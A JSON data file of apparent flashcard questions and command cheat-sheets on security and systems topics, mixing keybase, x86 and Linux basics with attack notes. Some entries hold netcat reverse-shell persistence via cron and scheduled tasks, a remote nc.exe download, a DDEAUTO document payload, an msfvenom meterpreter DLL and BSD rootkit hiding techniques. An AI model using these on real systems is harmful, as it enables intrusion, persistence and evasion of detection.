<ID>","comment":"Revoke device ID"},{"command":"keybase device add","comment":"Provision a new device"},{"command":"keybase paperkey","comment":"Make a new paper key"},{"command":"keybase encrypt <user> -m \"some secret\"","comment":"Encrypt message for user"},{"command":"\t-m","comment":"message flag (as opposed to stdin or file)"},{"command":"-i","comment":"input file flag"},{"command":"-o","comment":"output file flag"},{"command":"-b","comment":"binary output flag (instead of ASCII)"},{"command":"keybase encrypt <user> -in /file.mov -out /file.mov.encrypted","comment":"Encrypt a file for user"},{"command":"keybase decrypt -i /file.mov.encrypted -o /file.mov","comment":"Decrypt a file and save specify output file"},{"command":"keybase decrypt -i message.txt","comment":"Decrypte a single file"},{"command":"keybase sign -m \"I hereby abdicate the throne\"","comment":"Sign a message"},{"command":"keybase sign -i test.exe -b -o test.exe.signed","comment":"Sign a binary"},{"command":"keybase verify test.txt","comment":"Verify a signed file"},{"command":"keybase verify -i test.exe.signed -o test.exe","comment":"Verify a signed binary"},{"command":"keybase pgp <...encrypt stuff..> ","comment":"PGP encryption. Same as regular encryption, just with the pgp param"},{"command":"keybase pgp decrypt -i foo.txt.asc","comment":"Decrypt pgp encrypted file to stdout"},{"command":"keybase pgp decrypt -i foo.txt.asc -o foo.txt","comment":"Decrypt pgp to file"},{"command":"keybase pgp sign -m \"hello\"","comment":"PGP sign a message"},{"command":"keybase pgp sign --clearsign -m \"hello\"","comment":"PGP sign a message, but don't encode contents"},{"command":"keybase pgp sign -i test.txt --detatched","comment":"Sign a file, output just the signature."},{"command":"keybase pgp verify -i foo.txt","comment":"PGP verify self-signed file"},{"command":"keybase pgp verify -d foo.txt.asc -i foo.txt","comment":"PGP verify file + detatched signature"}],"tags":[],"platform":""},{"name":"windows/powershell/post-exploitation","questions":[{"question":"Do a ping sweep of the network 10.10.10.0/24 in Powershell.","answer":"1..255 | % {echo \"10.10.10.$_\"; ping -n 1 -w 100 10.10.10.$_ | Select-String ttl}"},{"question":"How would you port scan the address 1.2.3.4 using only Powershell?","answer":"1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect(\"1.2.3.4\", $_)) \"Port $_ is open\"} 2>$null"},{"question":"How would you fetch the file nc.exe from address 1.2.3.4 using only Powershell?","answer":"(New-Object System.Net.WebClient).DownloadFile(\"http://1.2.3.4/nc.exe\", \"nc.exe\")"},{"question":"List hotfixes in Windows using Powershell.","answer":"Get-HotFix"},{"question":"List programs set to start automatically in Windows using Powershell.","answer":"Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\run"},{"question":"Convert the string \"hello\" from ASCII to Base64 in Powershell.","answer":"[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes(\"hello\"))"},{"question":"How do you get all the Windows Firewall rules using only Powershell?","answer":"Get-NetFirewallRule -all"},{"question":"Allow address 1.2.3.4 inbound in the firewall using Powershell. Name the rule 'LetMeIn'","answer":"New-NetFirewallRule -Action Allow -DisplayName LetMeIn -RemoteAddress 1.2.3.4"}],"commands":[{"command":"1.255 | % {echo \"10.10.10.$_; ping -n 1 -w 100 10.10.10.$_ | Select-String ttl}","comment":"Ping sweep"},{"command":"1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect(\"10.10.10.10\", $_)) \"Port $_ is open!\"} 2>$null","comment":"Port scan"},{"command":"(New-Object System.Net.WebClient).DownloadFile(\"http://10.10.10.10/nc.exe\", \"nc.exe\")","comment":"Fetch a file via HTTP (like wget)"},{"command":"Get-HotFix","comment":"Get a list of Microsoft Hotfixes"},{"command":"cd HKLM:\\","comment":"Navigate to Windows registry"},{"command":"Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\run","comment":"List programs set to start automatically in the registry"},{"command":"[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes(\"PS for the win!\"))","comment":"Convert string form ASCII to Base64"},{"command":"Get-NetFirewallRule -all","comment":"Get Firewall rules"},{"command":"New-NetFirewallRule -Action Allow -DisplayName LetMeIn -RemoteAddress 10.10.10.25","comment":"Create/modify a rule"},{"command":"Invoke-Command -ComputerName <fakeserver> -Credential domain\\user -ScriptBlock {gci}","comment":"Invoke a command on a remote computer <fakeserver> using domain credentials"}],"tags":[],"platform":""},{"name":"linux/hack/persistence","questions":[{"question":"Add 10 minute callback to attacker at 1.2.3.4 on port 777 using bash in Linux.","answer":"echo \"0-59/10 * * * * nc 1.2.3.4 777 -e /bin/bash\" >> /etc/crontab"}],"commands":[{"command":"0-59/10 * * * * nc <IP> 777 -e /bin/bash","comment":"Crontab - set to callback to attacker's IP every 10 minutes with bash via netcat (to reassure)"}],"tags":[],"platform":""},{"name":"windows/hack/persistence","questions":[{"question":"Create a scheduled task to throw a callback shell to 1.2.3.4 on port 777 every hour in CMD and Powershell","answer":"SCHTASKS /Create /SC Hourly /TN hacked /TR \"nc 1.2.3.4 777 -e cmd.exe\""}],"commands":[{"command":"nc <IP> <PORT> -e cmd.exe","comment":"Netcat Callback/reverse shell. Run on victim's machine"}],"tags":[],"platform":""},{"name":"fuzzing/AFL","questions":[],"commands":[{"command":"Step 1.)","comment":"Fork"},{"command":"Step 2.)","comment":"Load and keep in shared memory. Stopping at main()"},{"command":"Step 3.)","comment":"Cycle seed files through looking for crash, hangs, or new paths."},{"command":"NOTE","comment":"1 cycle equals one path with all seed files."},{"command":"NOTE","comment":"Only really handles files and stin. Kernel and OS level fuzzing ins being developed."}],"tags":[],"platform":""},{"name":"linux/ssh/advanced","questions":[{"question":"Perform a forward SSH tunnel from local port 33 to remote server evil.com on remote port 80 for user 'frank' at server 'gatewaymachine'","answer":"ssh -L 33:evil.com:80 frank@gatewaymachine"},{"question":"Preform a reverse SSH tunnel to local host 1.2.3.4 on remote port 1000 to local port 5000 for user 'frank' at server hostname 'machine'","answer":"ssh -R 1000:1.2.3.4:5000 frank@machine"},{"question":"Create a Dynamic SSH port forward from localhost port 5050 to host gateway.com for user frank.","answer":"ssh -D 5050 frank@gateway.com"}],"commands":[{"command":"ssh -L <LOCAL_PORT>:<TargetSite>:<TargetPORT> <USER>@<GatewaySERVER>","comment":"Forward Tunnel: map port from remote machine/network on local machine"},{"command":"ssh -R <REMOTE_PORT>:<LOCAL_IP>:<LOCAL_PORT> <USER>@<GatewayServer>","comment":"Reverse Tunnel: make local port accessable to remote machine"},{"command":"ssh -D <LOCAL_PORT> <USER>@<GatewayServer>","comment":"Forward SOCKS traffic from local host on LOCAL_PORT throgh the GatewayServer"}],"tags":[{"tag":"ssh","none":"asdf"},{"tag":"linux","none":"asdf"},{"tag":"post-exploitation","none":"adsf"}],"platform":""},{"name":"windows/powershell/misc","questions":[{"question":"Lift all Windows API restrictions in Powershell.","answer":"$ExecutionContext.SessionState.LanguageMode = \"FullLanguage\""},{"question":"Limit Powershell commands to \"Constrained Language\"","answer":"$ExecutionContext.SessionState.LanguageMode = \"ConstrainedLanguage\""}],"commands":[{"command":"$ExecutionContext.SessionState.LanguageMode = \"FullLanguage\"","comment":"Allow all commands in Powershell (no restrictions to Windows API)"},{"command":"$ExecutionContext.SessionState.LanguageMode = \"ConstrainedLanguage\"","comment":"Swtich Powershell Language Mode to \"Constrained Language\""}],"tags":[],"platform":""},{"name":"reversing/x86","questions":[{"question":"Which register does REP use for number of repeats?","answer":"ecx"},{"question":"MOVSB copies data between which two registers?","answer":"esi edi"},{"question":"SCAS compares a value in AL/AX/EAX with data from the address in which register?","answer":"edi"},{"question":"STOS writes which registers to EDI, inc/decrementing EDI based off of the DF flag?","answer":"al/ax/eax"},{"question":"MULT multiplies the specified value by that store in which register?","answer":"eax"},{"question":"what is the function prologue?","answer":"push ebp; mov ebp, esp"},{"question":"What is the x86 function epilogue?","answer":"mov esp, ebp; pop ebp; ret"},{"question":"Which x86 calling convention requires the caller to clean up the stack?","answer":"CDECL"},{"question":"Which x86 calling convention requires the callee to clean up the stack?","answer":"STDCALL"},{"question":"Which x86 command 1.) Pushes RET address 2.) Changes EIP?","answer":"call"},{"question":"Which x86 command Pops address (ret) into EIP and transfers control to it?","answer":"ret"},{"question":"Which x86 command compares two numbers via subtraction?","answer":"cmp"},{"question":"Which x86 command compares two values via a logical AND?","answer":"test"}],"commands":[{"command":"rep","comment":"Repeats the following command the number of times that are in register ECX"},{"command":"movsb/movsw/movsd","comment":"Copies data between addressess ESI and EDI, and increments based of of the DF (direction flag)"},{"command":"scas","comment":"Compares AL/AX/EAX with data in EDI. It ends when a match is found. Direction based off of DF."},{"command":"stos","comment":"Same as scas, but writes AL/AX/EAX to EDI. Increments EDI based on DF. "},{"command":"Shift left/right.","comment":" Can be done for mult/div if divisor is power of 2."},{"command":"mult","comment":"Multiplies the specified value with EAX"},{"command":"call ","comment":"1.) Pushes RET address 2.) Changes EIP"},{"command":"ret","comment":"Pops address (ret) into EIP and transfers control to it. "},{"command":"CDECL","comment":"Calling convention where caller is responsible for cleaning up the stack"},{"command":"STDCALL","comment":"Calling convention where the callee must clean up the stack"},{"command":"function prologue","comment":"push ebp; mov ebp, esp"},{"command":"function epilogue","comment":"mov esp, ebp; pop ebp; ret"},{"command":"cmp","comment":"Compares two numbers by subtracting. Result can be found in EFLAGS"},{"command":"test","comment":"Compares two numbers by logical AND. Results in EFLAGS in ZF."}],"tags":[{"tag":"re","none":""},{"tag":"reversing","none":""},{"tag":"x86","none":""}],"platform":""},{"name":"linux/permissions","questions":[{"question":"How do you set uid of 'file' in Linux?","answer":"chmod u+s file"},{"question":"How do you setuid of 'file' using the masking in Linux?","answer":"chmod 4755 file"},{"question":"how do you setguid for root perms for 'file' in Linux?","answer":"chgrp g+s file"}],"commands":[{"command":"chmod u+s file","comment":"setuid for the file to allow execution as root"},{"command":"chmod 4755 file","comment":"same as above"},{"command":"chgrp g+s file","comment":"set group id permissions to run as root"},{"command":"chmod 2755 file","comment":"same as above"}],"tags":[{"tag":"linux","none":""},{"tag":"permissions","none":""}],"platform":""},{"name":"linux/processes","questions":[{"question":"Run 'cat' with a niceness level of 5 in Linux","answer":"nice -n 5 cat"},{"question":"Set a niceness level of 7 for existing PID 666 in Linux.","answer":"renice 7 -p 666"},{"question":"Look at information for process 666 in Linux.","answer":"cat /proc/666/status"},{"question":"List backgroup processes in linux","answer":"jobs"},{"question":"After suspending process with ctl-z, how do you send it to the background in Linux?","answer":"bg"},{"question":"how do you move job 1 into the foreground in linux?","answer":"fg %1"},{"question":"What is a command to monitor i/o and cpu usage in Linux?","answer":"iostat"},{"question":"What is a command to monitor memory usage in Linux?","answer":"vmstat"}],"commands":[],"tags":[{"tag":"linux","none":""},{"tag":"processes","none":""}],"platform":""},{"name":"linux/boot","questions":[{"question":"What is the first stage of linux boot?","answer":"BIOS"},{"question":"What is the second stage of linux boot?","answer":"bootloader"},{"question":"What is the third stage of linux boot?","answer":"kernel"},{"question":"What is the fourth stage of linux boot?","answer":"init"},{"question":"How do you list currently loaded Linux Kernel Modules?","answer":"lsmod"},{"question":"How do you remove kernel module bluetooth in Linux?","answer":"modprobe -r bluetooth"},{"question":"How do you load Linux kernel module bluetooth?","answer":"modprobe bluetooth"}],"commands":[],"tags":[],"platform":""},{"name":"linux/hack/smtp","questions":[{"question":"How do you verify the if the user 'root' exists on an SMTP server in linux after telneting?","answer":"VRFY root"},{"question":"How would you verify a user 'root' with RCPT in linux?","answer":"RCPT TO:root"},{"question":"How would you reveal address and alias of user root on an SMTP server in linux after telnetting?","answer":"EXPN root"}],"commands":[{"command":"VRFY","comment":"Confirms SMTP user exists (if enabled)"},{"command":"EXPN","comment":"Reveal actual address of users aliases and email (When enabled)"},{"command":"RCPT TO:root","comment":"Checks user exists"}],"tags":[{"tag":"smtp","none":""},{"tag":"hack","none":""},{"tag":"linux","none":""}],"platform":""},{"name":"windows/hack/documents","questions":[{"question":"What is the content of the field in a MS Word doc, that will autoexecute calc.exe upon opening the doc?","answer":"{DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe \"/k calc.exe\"}"}],"commands":[{"command":"{DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe \"/k calc.exe\"}","comment":"DDE that auto executes upon document opening"}],"tags":[{"tag":"DDE","none":""},{"tag":"excel","none":""},{"tag":"windows","none":""},{"tag":"office","none":""}],"platform":""},{"name":"windows/hack/privesc","questions":[{"question":"How do you show the config for Windows Firewall using Powershell","answer":"netsh firewall show config"},{"question":"How do you show the Windows Firewall state using Powershell?","answer":"netsh firewall show state"},{"question":"How do you list all scheduled tasks (not just startup) in Windows via Powershell?","answer":"schtasks /query /fo LIST /v"},{"question":"How do you show all the started services in windows?","answer":"net start"},{"question":"List all of the Windows Drivers via Powershell","answer":"DRIVERQUERY"},{"question":"How do you get the OS version and Name in Windows?","answer":"systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\""},{"question":"How do you list all user permissions to service Spooler using accesscheck systinternals tool in Windows?","answer":"accesschck.exe -ucqv Spooler"},{"question":"How do you use sc to look configure and manage the Spooler service in Windows?","answer":"sc qc Spooler"},{"question":"generate an evil dll to listen on 127.0.0.1 on port 6666 using msfvenom","answer":"msfvenom -p windows/meterpreter/reverse_tcp lhost=127.0.0.1 lport=6666 -f dll -o ./evil.dll"}],"commands":[{"command":"netsh firewall show config","comment":"Show config for Windows Firewall in PS"},{"command":"netsh firewall show state","comment":"Show firewall state in Windows in PS"},{"command":"schtasks /query /fo LIST /v","comment":"List all scheduled tasks"},{"command":"net start","comment":"list started services in windows"},{"command":"DRIVERQUERY","comment":"List all Windows Drivers via PS"},{"command":"systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\"","comment":"Get OS name and version "},{"command":"accesschk.exe -ucqv <service>","comment":"Get permissions to services for each user"},{"command":"Windows DLL Load order","comment":""},{"command":"---------------------","comment":""},{"command":"1.) Directory that app is loaded from ","comment":""},{"command":"2.) C:\\Windows\\System32","comment":""},{"command":"3.) C:\\Windows\\System (16-bit dir)","comment":""},{"command":"4.) C:\\Windows","comment":""},{"command":"5.) CWD","comment":""},{"command":"PATH","comment":""}],"tags":[],"platform":""},{"name":"bsd/rootkit","questions":[],"commands":[{"command":"DECLARE_MODULE","comment":"Macro fro linking and registering a KLD with the kernel"},{"command":"Module Event Handler","comment":"Called when KLD is loaded or unloaded"},{"command":"systemcall function, sysent structure, offset value","comment":"Three things unique to each system call module"},{"command":"SYSCALL_MODULE","comment":"More convenient version of DECLARE_MODULE"},{"command":"modfind","comment":"C Function that returns the module id number given it's name"},{"command":"modstat","comment":"C Function that returns a \"stat\" struct of info, given the modules id number"},{"command":"copyin and copyinstr","comment":"C Functions to copy data from user space into kernel space"},{"command":"copyout","comment":"C Function to copy from kernel space to user space"},{"command":"copystr","comment":"C Funciton to copy data from kernel space to kernel space"},{"command":"Character Device","comment":"Interface for accessing a specific device within the BSD kernel"},{"command":"cdevsw structure, character device funcitons, device registration routine","comment":"Three items unique to Character Device Modules"},{"command":"cdevsw structure","comment":"Structure that goes in the device switch table that defines the device. Only the declared attributes are use (they don't all have to be declared). All others will be considered unsupported."},{"command":"Character device functions","comment":"One must exist for every entry in cdevsw. Prototypes found in sys/conf.h"},{"command":"Device Registration Routine","comment":"Creates/installs character device on /dev and registers it with the device filesystem DFS by calling make_dev"},{"command":"DEV_MODULE","comment":"Macro that wraps DECLARE_MODULE and allow syou to call it without explicitly setting up moduledata struct first"},{"command":"kldstat","comment":"Lists the status of any files dynamically linked to the kernel"},{"command":"---------------","comment":""},{"command":"HOOKING","comment":""},{"command":"---------------","comment":""},{"command":"hooking","comment":"New modules that list its address as that of another function/call. Thus basically MITM the call of the function."},{"command":"SYS_mkdir","comment":"sysent offset value for mkdir system call. All syscall constants can be found in sys/syscall.h"},{"command":"keylogging via hooking","comment":"Hooking the 'read' syscall. (for full keylogging you will also need readv, pread, and preadv)"},{"command":"ktrace","comment":"Utility command for performing Kernel Process Tracing"},{"command":"kdump","comment":"Utility command for actually looking at system calls for function specified by ktrace"},{"command":"protosw","comment":"struct that maintains the protocol switch table (for tcp/ip, etc)"},{"command":"/sys/netinet/in_proto.c","comment":"File where each protocol's protosw is defined"},{"command":"mbuf","comment":"structure that holds data between two protocols. To manipulate we reference the m_len and m_data fields of mbuf"},{"command":"---------------","comment":""},{"command":"DKOM","comment":""},{"command":"---------------","comment":""},{"command":"queue data structure (or list)","comment":"Kernel structure with much interesting information"},{"command":"LIST_HEAD","comment":"Macro for pointing to first element of the list (queue)(single pointer). This is doubly linked."},{"command":"LIST_HEAD_INITIALIZER","comment":"Macro to initialize the head of a doubly linked list"},{"command":"LIST_ENTRY","comment":"Macro to declare struct that connects elements in a doubly linked list. Contains 2 ptrs for previous and next entries"},{"command":"LIST_FOREACH","comment":"Macro for traversing items in a list"},{"command":"LIST_REMOVE","comment":"Macro for decoupling (removing) item in doubly linked list"},{"command":"NOTE: Thread lock is necessary","comment":"When manipulating kernel queue data structures, if another thread accesses same object, data corruption can occur."},{"command":"Mutexes","comment":"Provide mutual exclusion for one or more data objects, and primary method of thread sync"},{"command":"mtx_lock","comment":"function to aquire thread lock"},{"command":" ","comment":"caller will sleep if another thread is holding the mutex"},{"command":"mtx_unlock","comment":"Function to release a mutex lock"},{"command":"sx_slock and sx_xlock","comment":"Shared/exclusive locks, simple r/w locks that can be held across a sleep"},{"command":"sx_sunlock sx_xunlon","comment":"Commands to release shared/exclusive locks"},{"command":"proc","comment":"Each process is maintained in a proc struct"},{"command":"allproc","comment":"list of all running processes. To hide a process, just remove it form allproc"},{"command":"hash table","comment":"Contiguous array of LIST_HEAD entries initialized by hashinit"},{"command":"hashinit","comment":"allocates space for hash table given size. returns pointer if successful, with bitmask"},{"command":"pidhashtbl","comment":"hash table for looking up by PID. Faster than standard allproc list lookup"},{"command":"pfind","comment":"Locates process via pidhashtbl"},{"command":"PIDHASH","comment":"Macro for traversing pidhashtbl. Macro substitution for pidhashtable."},{"command":"inpcb","comment":"Structure  created to hold internetworking data (addresses, ports, etc.). Stand for Internet protocol control block"},{"command":"tcbinfo.listhead","comment":"structure that maintins list of inpcb structures associated with tcp base sockets"},{"command":"---------------","comment":""},{"command":"Kernel Object Hooking","comment":""},{"command":"---------------","comment":""},{"command":"cdevp_list","comment":"Queue (doubly linked) that contains all active devices in kernel"},{"command":"devmtx","comment":"Mutex for devices (found in fs/devfs/devfs_int.h"},{"command":" ","comment":"Kernel Object Hooking (KOH) is mostly like DKOM except it uses call hooks instead of data-state changes"},{"command":"kvm_openfiles","comment":"Function initializes kernel virtual memory. Returns descriptor to use in subsequent calls"},{"command":"kvm_nlist","comment":"Function - retrieves symbol table entries from kernel image."},{"command":"kvm_geterr","comment":"Function - returns string describing most recent error condition on kernel"},{"command":"kvm_read","comment":"Function - reads data from kernel virtual memory (kvm)"},{"command":"kvm_write","comment":"Function - writes data to kernel virtual memory (kvm)"},{"command":"kvm_close","comment":"Function - closes kvm descriptor"},{"command":"----- x86 Call statements","comment":""},{"command":"near call","comment":"x86 call type where the address of instruction after the call is saved on the stack"},{"command":" ","comment":"Thus the operand is the address of called procedure, minus the address of the instruction following the call statement"},{"command":"----- Allocating Kernel Memory","comment":""},{"command":"malloc","comment":"Funciton - Allocates specified amount of memory in kernel space"},{"command":"MALLOC","comment":"Macro - for calling malloc function (for compatability with legacy systems)"},{"command":"free","comment":"Function - for freeing allocated memory"},{"command":"FREE","comment":"Macro - for calling free. (For legacy systems)"},{"command":"----- Inline Function Hooks","comment":"Place an unconditional jump in body of function to section of mem you control"},{"command":"NOTE: Generally need to avoid setting hadcoded offsets","comment":""},{"command":"----- Cloaking System Call hooks","comment":""},{"command":" ","comment":"Patching a sys call dispatcher with inline function hook to reference a Trojan syscall table instead of the real one."},{"command":"----- Bypassing HIDS","comment":""},{"command":"Execution Redirection","comment":"Create another binary and  execute it, and leave original alone. Thus the hash remains the same."},{"command":"execve","comment":"System call - to execute a file"},{"command":"NOTE: With execution redirection, must copy execve calls out into userspace (if exploiting execve)","comment":""},{"command":"----- File Hiding","comment":""},{"command":"getdirentries","comment":"System call - for listing directories contents (can be hooked to hide files)"},{"command":"NOTE: ","comment":"We can pull in the direntries list to kernel memory, remove our trojan, and overwrite it back to userland"},{"command":"NOTE: The evil kernel object can still be found with kldstat","comment":""},{"command":"----- Hiding the KLD","comment":""},{"command":"linker_files","comment":"List containing loaded linker files"},{"command":"Giant","comment":"Catch-all lock used on entire kernel (because linker_files isn't protected by dedicated lock)"},{"command":"refs","comment":"field in linker_files that has number of objects referenced. Must remember to subtract this value when addint objects."},{"command":"modules","comment":"List containing loaded kernel modules"},{"command":"NOTE: We can grab modules and linker_files lists and change them too","comment":""},{"command":"NOTE: Problem - this still changes their MAC times","comment":""},{"command":"----- Preventing Access, Modification, and Change Time Updates","comment":""},{"command":"time[]","comment":"Array with seconds and milliseconds for storing time"},{"command":"utimes","comment":"Function to roll back times. "},{"command":"NOTE: We cannot alter the 'change' time. only the access and modification times. Enter ufs_itimes","comment":""},{"command":"ufs_itimes","comment":"Function responsible for updating an inode's change time."}],"tags":[],"platform":""},{"name":"programming/c","questions":[],"commands":[{"command":"inline functions","comment":"Functions that are prepended with 'inline'. Compiler tries to put them inside of their calling functions. Not guaranteed."},{"command":"Arrays can't be assigned values with symbolic constants with 'const' keyword","comment":""},{"command":"unsigned char","comment":"Will give you the extended ASCII characters (numbers 128-255). char will just give you 0-127"},{"command":"malloc(<size>)","comment":"Allocates memory of <size> bytes. Returns a void pointer"},{"command":"Union","comment":"Like a struct, but can only access one element at a time, as they share memory."},{"command":"extern","comment":"Good practice to preface variables in functions that are referencing external variables"},{"command":"static","comment":"Makes a variable in a function, persist beyond the function call.(not destroyed after return)"},{"command":"register","comment":"Signals compiler that the automatic variable should be stored in CPU register, and not memory."},{"command":"NOTE: Initialize local variables or they will contain random info. Only external variables automatically init to 0","comment":""}],"tags":[],"platform":""}]}